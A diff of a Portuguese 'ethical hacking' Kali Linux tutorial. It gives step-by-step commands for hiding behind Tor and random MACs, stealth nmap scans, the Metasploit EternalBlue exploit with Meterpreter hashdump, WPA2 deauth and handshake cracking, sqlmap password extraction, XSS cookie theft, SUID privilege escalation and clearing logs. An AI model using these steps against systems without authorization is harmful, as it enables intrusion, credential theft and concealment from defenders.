@@ -12,131 +12,147 @@ Cada capítulo foi desenhado seguindo a metodologia **PTES (Penetration Testing 
 
 ---
 
-# 💀 Capítulo 1: O Preparo do Campo de Batalha
+# 💀 Capítulo 1: O Preparo do Campo de Batalha (Predator's Setup)
 
-Antes de qualquer ação, um profissional garante sua própria segurança. Se você for detectado antes mesmo de começar, sua operação falhou. 
+Bem-vindo à arena. Antes de disparar o primeiro comando, você precisa entender que no mundo do Hacking Ético, a sua maior arma não é o seu conhecimento em exploits, mas sim a sua **invisibilidade**. Um predador barulhento nunca captura sua presa.
 
-## 🕵️ 1.1 O Protocolo Ghost (Invisibilidade Digital)
+## 🕵️ 1.1 O Protocolo Ghost (Anonimato Absoluto)
 
-O seu maior erro seria usar sua conexão doméstica pura para uma auditoria. Vamos criar camadas de proteção que tornem o rastreio impossível.
+No Kali, ser anônimo não é apenas usar uma VPN. É garantir que nenhum dado saia da sua rede sem ser mascarado.
 
-### 🧤 1.1.1 Camada 1: O Túnel Tor e Proxychains
-O Tor (The Onion Router) roteia seu tráfego por três nós globais. O Proxychains força qualquer ferramenta do Kali a passar por esse túnel.
+### 1.1.1 Proxychains & Tor (Sua Sombra)
+O Proxychains permite que você "encadeie" vários servidores proxy. Se um hacker te rastrear, ele vai chegar na Holanda, depois no Japão, depois na Rússia, antes de chegar (talvez) em você.
 
-**🎯 O Objetivo:** Garantir que o IP que o alvo vê seja de um servidor na Holanda ou Japão, nunca o seu.
+**🛠️ Configuração Passo a Passo:**
+1. Instale o serviço Tor: `sudo apt install tor -y`
+2. Ative o Tor: `sudo service tor start`
+3. Configure o Proxychains: `sudo nano /etc/proxychains4.conf`
+   - Remova o `#` de `dynamic_chain`.
+   - Adicione `#` em `strict_chain`.
+   - No final do arquivo, adicione: `socks5 127.0.0.1 9050`.
 
-**🛠️ O Comando de Configuração:**
-```bash
-# Instalando e iniciando a rede das cebolas
-sudo apt install tor -y && sudo service tor start
-
-# Configurando o redirecionamento (Edite o /etc/proxychains4.conf)
-# Habilite 'dynamic_chain' e adicione 'socks5 127.0.0.1 9050' no fim.
-```
-
-**🔍 Na Prática:**
-Para escanear um site sem ser detectado:
+**🔍 Uso Profissional:**
+Para rodar qualquer ferramenta via Proxychains:
 ```bash
 proxychains4 nmap -sT -PN alvo.com
 ```
 
----
+## 🎭 1.2 MacChanger (Mudando sua Identidade de Fábrica)
 
-# 🔍 Capítulo 2: A Arte do Reconhecimento (OSINT)
+O endereço MAC é a sua assinatura física. Se você for detectado em uma rede, o MAC é o que te liga à máquina real.
 
-90% do trabalho de um hacker de elite é **observação**. Atacar sem informação é como dar soco no escuro.
-
-## 🌎 2.1 Coletando Inteligência de Fontes Abertas (OSINT)
-
-OSINT é a coleta de dados que o próprio alvo deixou público sem perceber.
-
-### 🕵️ 2.1.1 Google Dorks: O Scanner Gratuito
-O Google indexa muito mais do que sites; ele indexa erros de segurança.
-
-**🎯 O Objetivo:** Encontrar documentos sensíveis (PDFs, Excel) que contenham nomes de funcionários ou configurações de rede.
-
-**🛠️ Os Comandos de Busca:**
-- `site:alvo.com filetype:pdf`: Lista manuais e relatórios internos.
-- `site:alvo.com intitle:"index of"`: Revela pastas do servidor que deveriam estar trancadas.
+**🛠️ Comando de Elite:**
+```bash
+sudo ifconfig eth0 down
+sudo macchanger -r eth0
+sudo ifconfig eth0 up
+```
+*Dica: O `-r` gera um MAC aleatório de um fabricante real (Apple, Samsung), dificultando o rastreio.*
 
 ---
 
-# 🕷️ Capítulo 3: Exploração de Sistemas (Metasploit)
+# 🔍 Capítulo 2: A Arte do Reconhecimento (OSINT & Scans)
 
-Uma vez que encontramos a porta, precisamos da "chave mestra". Para isso, usamos o **Metasploit Framework**.
+90% de um ataque bem-sucedido acontece no **Reconhecimento**. Hacking não é quebrar portas; é encontrar a porta que alguém esqueceu de trancar.
+
+## 🌎 2.1 OSINT: Inteligência de Fontes Abertas
+OSINT é a arte de coletar informações públicas para criar um dossiê do alvo.
+
+### 2.1.1 Google Dorks (Pesquisa Avançada)
+Use o Google para encontrar o que não deveria estar lá:
+- `site:alvo.com filetype:pdf`: Encontra manuais e relatórios internos.
+- `site:alvo.com intitle:"index of"`: Revela pastas do servidor expostas.
+
+## 🛰️ 2.2 Mapeamento de Rede (Nmap Expert)
+Agora precisamos saber o que está rodando nos servidores "vivos".
+
+**🛠️ O Scan Silencioso (Stealth):**
+```bash
+sudo nmap -sS -sV -O -p- [IP_ALVO]
+```
+- `-sS`: Stealth Scan (Não fecha a conexão completa).
+- `-sV`: Detecta a **versão** exata do serviço.
+- `-p-`: Escaneia as **65.535 portas**.
+
+---
+
+# 🕷️ Capítulo 3: Exploração de Sistemas (Metasploit Masterclass)
+
+Uma vez que encontramos a brecha, precisamos da "chave mestra". Usaremos o **Metasploit Framework**.
 
 ## 🏗️ 3.1 A Anatomia do Ataque
-Não disparar comandos aleatórios. Entenda a lógica:
-1.  **O Exploit:** O veículo que atravessa a falha.
-2.  **O Payload:** O software que te dá o controle (Meterpreter).
+1.  **Exploit:** O veículo que atravessa a falha.
+2.  **Payload:** O software que te dá o controle (Meterpreter).
 
-**🔍 Caso Real:**
-Imagine que você descobriu um servidor antigo rodando o protocolo SMB (porta 445). Usaremos o lendário **EternalBlue**.
-
-**🛠️ Seqüência de Ataque:**
+**🛠️ Fluxo de Ataque (Exemplo EternalBlue):**
 ```bash
 msfconsole
 use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS [IP_DO_ALVO]
+set RHOSTS [IP_DA_VITIMA]
 set LHOST [SEU_IP]
 exploit
 ```
-**✅ O Resultado:** Se a barra de progresso terminar, você terá um terminal **Meterpreter**. Agora, o PC dele é seu.
+
+## 💀 3.2 Meterpreter: O Controle Total
+Se a barra de progresso terminar, você terá acesso completo:
+- `sysinfo`: Vê as informações do sistema.
+- `screenshot`: Tira uma foto da tela da vítima.
+- `hashdump`: Extrai senhas criptografadas.
 
 ---
 
-# 📶 Capítulo 4: Guerra Wireless
+# 📶 Capítulo 4: Guerra Wireless (Wi-Fi Cracking)
 
-Sua conexão Wi-fi é a maior vulnerabilidade da sua casa ou empresa. Ela irradia sinal para fora das paredes, onde qualquer um pode capturar.
+Sua conexão Wi-fi é a maior vulnerabilidade física. Ela irradia sinal para fora das paredes, onde qualquer um pode "ouvir".
 
-## 📡 4.1 O Sequestro do Handshake
-Para descobrir a senha do Wi-fi, não atacamos o roteador, mas sim a comunicação entre o celular e o roteador.
+## 📡 4.1 O Ataque de Handshake (WPA2)
+Para quebrar a senha, capturamos o momento em que um usuário se conecta ao roteador.
 
-**🛠️ O Fluxo do Ataque:**
-1.  **Monitorar:** `airmon-ng start wlan0`
-2.  **Capturar:** `airodump-ng --bssid [MAC] -c [CH] -w cap wlan0mon`
-3.  **Derrubar (Deauth):** `aireplay-ng -0 5 -a [MAC] wlan0mon`
+**🛠️ Passo a Passo:**
+1. **Modo Monitor:** `sudo airmon-ng start wlan0`
+2. **Capturar:** `sudo airodump-ng -c [CH] --bssid [MAC] -w cap wlan0mon`
+3. **Deauth (Chutar usuário):** `sudo aireplay-ng -0 5 -a [MAC] wlan0mon`
 
-**✅ O Resultado:** Ao derrubar o usuário, ele tenta reconectar automaticamente. Nesse segundo, o Kali captura o **Handshake** (a senha criptografada). Depois, só precisamos de uma "wordlist" para revelar o segredo.
+**✅ O Resultado:** Ao derrubar o usuário, ele reconecta automaticamente e o Kali captura o **Handshake**. Depois, usamos o **Aircrack-ng** com uma wordlist (`rockyou.txt`) para revelar a senha.
 
 ---
 
 # 🕸️ Capítulo 5: Web Hacking (A Invasão de Sites)
 
-Hoje, 99% das empresas estão na Web. Invadir o site é, muitas vezes, invadir o banco de dados de clientes.
+Hoje, 99% das empresas vivem na Web. Invadir o site é invadir o coração do negócio.
 
-## 🛢️ 5.1 SQL Injection: O Roubo de Dados
-Se um site não trata bem o que o usuário digita na busca, podemos fazer perguntas diretamente ao banco de dados.
+## 🛢️ 5.1 SQL Injection (SQLMap)
+Se um site não trata bem o que o usuário digita, podemos "falar" com o banco de dados.
 
-**🛠️ O Comando Mestre (SQLMap):**
+**🛠️ Comando Mestre:**
 ```bash
 sqlmap -u "https://site.com/view.php?id=10" --dbs --batch
 ```
-**🔍 O que aconteceu?** O SQLMap encontrou o banco de dados e está "limpando" todas as senhas dos usuários para você.
+O SQLMap encontrará as tabelas e poderá extrair logins e senhas de todos os usuários.
+
+## ⚡ 5.2 XSS (Cross-Site Scripting)
+Permite injetar JavaScript no navegador de outros usuários para roubar **Cookies de Sessão**.
 
 ---
 
-# 💰 Capítulo 6: O Relatório que Vale Ouro
+# 🚀 Capítulo 6: Pós-Exploração e Relatórios (A Hora do Dinheiro)
 
-A diferença entre um "hacker" e um **Consultor de Segurança** é o papel que você entrega no final.
+O cliente não paga pela invasão; ele paga pelo **Relatório**. Isso separa o amador do Consultor Profissional.
 
-## 📜 6.1 Transformando Invasão em Dinheiro
-Um relatório profissional deve conter:
-1.  **Sumário Executivo:** Onde você explica para o dono da empresa o risco financeiro.
-2.  **Solução:** Não aponte apenas o erro; mostre como fechar o buraco.
+## 🔝 6.1 Escalação de Privilégios
+Se você entrou como usuário comum, use `find / -perm -u=s -type f 2>/dev/null` para procurar binários SUID e virar **root**.
 
----
+## 🧹 6.2 Limpando Rastros
+Um hacker ético deixa tudo como encontrou. 
+- Linux: `history -c`
+- Windows (Meterpreter): `clearev`
 
-# 🎁 Bônus: The Ultimate Cheat Sheet
-*(Consulte esta tabela durante suas operações)*
-
-| Fase | Ferramenta | Comando Chave |
-| :--- | :--- | :--- |
-| **Anonimato** | Tor | `service tor start` |
-| **Scan** | Nmap | `nmap -sS -A [IP]` |
-| **Exploit** | Metasploit | `msfconsole` |
-| **Web** | SQLMap | `sqlmap -u [URL]` |
+## 💰 6.3 Estrutura do Relatório de Elite
+1. **Sumário Executivo:** Risco financeiro e visão geral (para o dono).
+2. **Severidade das Falhas:** Crítica, Alta, Média, Baixa.
+3. **Remediação:** Como o time técnico deve consertar o erro.
 
 ---
+
 **"Seja ético. Seja técnico. Seja invisível."**
 **Matheus TI - Master Edition 2024**
